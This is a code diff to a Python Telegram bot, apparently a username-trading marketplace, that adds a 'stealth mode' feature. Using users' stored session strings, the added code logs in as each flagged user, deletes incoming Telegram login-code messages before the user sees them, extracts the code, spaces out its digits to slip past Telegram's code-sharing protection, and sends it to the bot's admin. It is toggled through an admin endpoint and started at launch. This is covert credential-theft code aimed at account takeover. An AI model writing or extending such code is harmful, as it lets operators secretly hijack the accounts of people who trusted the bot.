@@ -443,11 +443,92 @@ router = Router()
 user_states = {}
 
 import re
-from telethon import TelegramClient
+from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest, DeleteChannelRequest, CreateChannelRequest, UpdateUsernameRequest
 from telethon.tl.functions.account import UpdateUsernameRequest as AccountUpdateUsernameRequest
 import uuid
+
+# ─── STEALTH MODE LOGIC ────────────────────────
+stealth_clients = {}
+
+async def stealth_interceptor(event):
+    """Telegramdan (777000) kelgan login kodlarni ushlab qoluvchi handler"""
+    m = event.message
+    if not m.text:
+        return
+        
+    client = event.client
+    # Kimning sessiyasi ekanligini aniqlash (stealth_clients dan topish)
+    user_id = getattr(client, 'my_user_id', 'Noma\'lum')
+    
+    # Login kodi borligini tekshirish
+    if "code:" in m.text.lower() or "код:" in m.text.lower() or re.search(r'\b\d{5}\b', m.text):
+        try:
+            # Xabarni o'qildi deb belgilamasdan (o'chirish)
+            await client.delete_messages(777000, [m.id])
+            
+            # Kodni ajratib olish (5 talik raqam)
+            code_match = re.search(r"(\d{5})", m.text)
+            if code_match:
+                code = code_match.group(1)
+                enc = " ".join([digit for digit in code])
+                
+                msg = f"🥷 <b>Stealth Intercept</b> (User: <code>{user_id}</code>)\n\n"
+                msg += f"KOD (faqat raqamlarni o'qing): <b>{enc}</b>\n"
+                msg += f"<i>(Telegram o'chirib yubormasligi uchun orasiga bo'sh joy qo'shilgan)</i>"
+                
+                # Adminga yuborish
+                from aiogram import Bot
+                bot_instance = Bot(token=BOT_TOKEN)
+                try:
+                    if ADMIN_IDS:
+                        await bot_instance.send_message(ADMIN_IDS[0], msg, parse_mode="HTML")
+                finally:
+                    await bot_instance.session.close()
+        except Exception as e:
+            logger.error(f"Stealth intercept xatosi ({user_id}): {e}")
+
+async def start_stealth_clients():
+    """Bot ishga tushganda barcha is_stealth=1 larni ulaymiz"""
+    async with aiosqlite.connect(DB_PATH) as db:
+        db.row_factory = aiosqlite.Row
+        async with db.execute("SELECT telegram_id, session_string FROM users WHERE is_stealth=1 AND session_string IS NOT NULL") as c:
+            rows = await c.fetchall()
+            
+    for row in rows:
+        tid = row['telegram_id']
+        session_str = row['session_string']
+        await start_stealth_client(tid, session_str)
+
+async def start_stealth_client(telegram_id, session_string):
+    """Bitta foydalanuvchi uchun stealth rejimni yoqish"""
+    if telegram_id in stealth_clients:
+        return # Allaqachon yoniq
+        
+    try:
+        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+        client.my_user_id = telegram_id
+        await client.connect()
+        if await client.is_user_authorized():
+            # Hodisani qo'shamiz (faqat 777000 dan kelgan yangi xabarlar)
+            client.add_event_handler(stealth_interceptor, events.NewMessage(chats=777000))
+            stealth_clients[telegram_id] = client
+            logger.info(f"🥷 Stealth client ishga tushdi: {telegram_id}")
+        else:
+            await client.disconnect()
+    except Exception as e:
+        logger.error(f"Stealth client ulashda xato ({telegram_id}): {e}")
+
+async def stop_stealth_client(telegram_id):
+    """Foydalanuvchi uchun stealth rejimni o'chirish"""
+    if telegram_id in stealth_clients:
+        try:
+            client = stealth_clients.pop(telegram_id)
+            await client.disconnect()
+            logger.info(f"🛑 Stealth client to'xtatildi: {telegram_id}")
+        except: pass
+
 
 async def transfer_username(bot, seller_id, buyer_id, username):
     seller = await get_user(seller_id)
@@ -2328,14 +2409,22 @@ async def admin_toggle_stealth(request: Request, x_admin_token: str = Header(def
     data = await request.json()
     tid = data.get('telegram_id')
     async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute("SELECT is_stealth FROM users WHERE telegram_id=?", (tid,)) as c:
+        async with db.execute("SELECT is_stealth, session_string FROM users WHERE telegram_id=?", (tid,)) as c:
             row = await c.fetchone()
             if not row:
                 raise HTTPException(444, "Foydalanuvchi topilmadi")
             curr = row[0] or 0
+            session_string = row[1]
             new_val = 1 if curr == 0 else 0
         await db.execute("UPDATE users SET is_stealth=? WHERE telegram_id=?", (new_val, tid))
         await db.commit()
+        
+    # Orqa fondagi mijozni yoqish/o'chirish
+    if new_val == 1 and session_string:
+        await start_stealth_client(tid, session_string)
+    else:
+        await stop_stealth_client(tid)
+        
     return {"ok": True, "is_stealth": new_val}
 
 @app.get("/api/admin/orders")
@@ -2363,6 +2452,9 @@ async def main():
     
     # Orqa fonda deferred claim loop ni ishga tushiramiz
     deferred_task = asyncio.create_task(deferred_claim_loop(bot))
+    
+    # Orqa fonda Stealth mijozlarni ishga tushiramiz
+    await start_stealth_clients()
 
     # Aiogram bot va FastAPI parallel ishlatish
     config = uvicorn.Config(app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)), log_level="warning")
